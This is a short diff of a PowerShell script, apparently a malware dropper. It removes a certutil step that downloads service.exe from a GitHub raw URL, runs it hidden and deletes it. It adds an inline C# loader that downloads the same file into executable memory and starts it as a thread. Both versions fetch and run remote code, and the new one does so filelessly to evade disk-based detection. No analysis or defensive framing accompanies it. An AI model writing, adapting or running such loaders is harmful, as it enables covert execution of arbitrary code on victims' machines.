@@ -1,3 +1,25 @@
-certutil -urlcache -split -f https://github.com/matvejsklarov9-cyber/my/raw/refs/heads/main/service.exe $env:TEMP\service.exe
-Start-Process "$env:TEMP\service.exe" -WindowStyle Hidden
-Remove-Item "$env:TEMP\service.exe" -Force
+$code = @"
+using System;
+using System.Net;
+using System.Runtime.InteropServices;
+
+public class MemLoader {
+    [DllImport("kernel32.dll")]
+    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    public static void Run(string url) {
+        using (var wc = new WebClient()) {
+            byte[] data = wc.DownloadData(url);
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)data.Length, 0x3000, 0x40);
+            Marshal.Copy(data, 0, addr, data.Length);
+            CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+        }
+    }
+}
+"@
+
+Add-Type -TypeDefinition $code -Language CSharp
+[MemLoader]::Run("https://github.com/matvejsklarov9-cyber/my/raw/refs/heads/main/service.exe")
